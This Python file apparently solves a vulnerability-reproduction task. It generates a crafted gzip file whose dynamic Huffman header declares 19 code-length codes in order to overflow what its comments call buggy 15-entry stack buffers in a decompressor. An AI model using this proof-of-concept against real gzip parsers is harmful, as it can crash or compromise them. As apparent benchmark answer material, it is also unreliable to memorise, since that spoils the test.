import struct
import binascii


class BitWriter:
    def __init__(self):
        self.bits = []

    def write_bits(self, value: int, nbits: int) -> None:
        for i in range(nbits):
            self.bits.append((value >> i) & 1)

    def get_bytes(self) -> bytes:
        out = []
        cur = 0
        bitpos = 0
        for b in self.bits:
            cur |= b << bitpos
            bitpos += 1
            if bitpos == 8:
                out.append(cur)
                cur = 0
                bitpos = 0
        if bitpos > 0:
            out.append(cur)
        return bytes(out)


def build_canonical_codes(lengths):
    """Build canonical Huffman codes from code lengths."""
    if not lengths:
        return []

    max_len = max(lengths)
    if max_len == 0:
        return [0] * len(lengths)

    bl_count = [0] * (max_len + 1)
    for l in lengths:
        if l > 0:
            bl_count[l] += 1

    next_code = [0] * (max_len + 1)
    code = 0
    for bits in range(1, max_len + 1):
        code = (code + bl_count[bits - 1]) << 1
        next_code[bits] = code

    codes = [0] * len(lengths)
    for n, l in enumerate(lengths):
        if l > 0:
            codes[n] = next_code[l]
            next_code[l] += 1
    return codes


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build a minimal valid gzip file with a dynamic Huffman block that uses
        # a 19-entry code-length tree (HCLEN=15) and literal/length tree sizes
        # that exceed the buggy 15-entry stack buffers.

        literal_byte = ord('A')

        # Dynamic Huffman header parameters
        HLIT_val = 0   # 257 literal/length codes
        HDIST_val = 1  # 2 distance codes
        HCLEN_val = 15  # 19 code-length codes

        num_lit = HLIT_val + 257  # 257
        num_dist = HDIST_val + 1  # 2

        # Code length alphabet (19 symbols: 0..18)
        # We use only symbols 0 and 1 with length 1; others length 0.
        cl_lengths_symbol = [0] * 19
        cl_lengths_symbol[0] = 1
        cl_lengths_symbol[1] = 1

        # Build canonical codes for the code-length alphabet
        cl_codes = build_canonical_codes(cl_lengths_symbol)

        # Order in which code length code lengths are stored in the stream
        code_length_order = [16, 17, 18, 0, 8, 7, 9, 6, 10,
                             5, 11, 4, 12, 3, 13, 2, 14, 1, 15]

        bw = BitWriter()

        # DEFLATE block header: final block, dynamic Huffman (BTYPE=2)
        bw.write_bits(1, 1)          # BFINAL=1
        bw.write_bits(2, 2)          # BTYPE=10 (dynamic)
        bw.write_bits(HLIT_val, 5)   # HLIT
        bw.write_bits(HDIST_val, 5)  # HDIST
        bw.write_bits(HCLEN_val, 4)  # HCLEN

        # Write code-length code lengths (3 bits each) in the specified order
        for i in range(HCLEN_val + 4):  # 19 entries
            sym = code_length_order[i]
            length = cl_lengths_symbol[sym]
            bw.write_bits(length, 3)

        # Literal/length code lengths: 257 entries
        lit_lengths = [0] * num_lit
        lit_lengths[literal_byte] = 1  # one literal
        lit_lengths[256] = 1          # end-of-block code

        # Distance code lengths: 2 entries, both length 1 to form a full tree
        dist_lengths = [1] * num_dist

        # Helper to encode a single length using the code-length Huffman tree
        def encode_length(length_val: int) -> None:
            # Only lengths 0 and 1 are used, mapped directly to symbols 0 and 1.
            sym = length_val
            code = cl_codes[sym]
            bitlen = cl_lengths_symbol[sym]
            bw.write_bits(code, bitlen)

        # Encode literal/length and distance code length arrays
        for l in lit_lengths:
            encode_length(l)
        for l in dist_lengths:
            encode_length(l)

        # Build literal/length Huffman codes to encode the actual data
        lit_codes = build_canonical_codes(lit_lengths)

        # Encode one literal 'A' and an end-of-block symbol
        bw.write_bits(lit_codes[literal_byte], lit_lengths[literal_byte])
        bw.write_bits(lit_codes[256], lit_lengths[256])

        deflate_data = bw.get_bytes()

        # Uncompressed payload is just b"A"
        payload = b"A"

        # GZIP header: ID1, ID2, CM=8 (deflate), FLG=0, MTIME=0, XFL=0, OS=255
        header = b"\x1f\x8b\x08\x00" + b"\x00\x00\x00\x00" + b"\x00" + b"\xff"

        # Correct CRC32 and ISIZE for the payload
        crc = binascii.crc32(payload) & 0xFFFFFFFF
        isize = len(payload) & 0xFFFFFFFF
        trailer = struct.pack("<II", crc, isize)

        return header + deflate_data + trailer
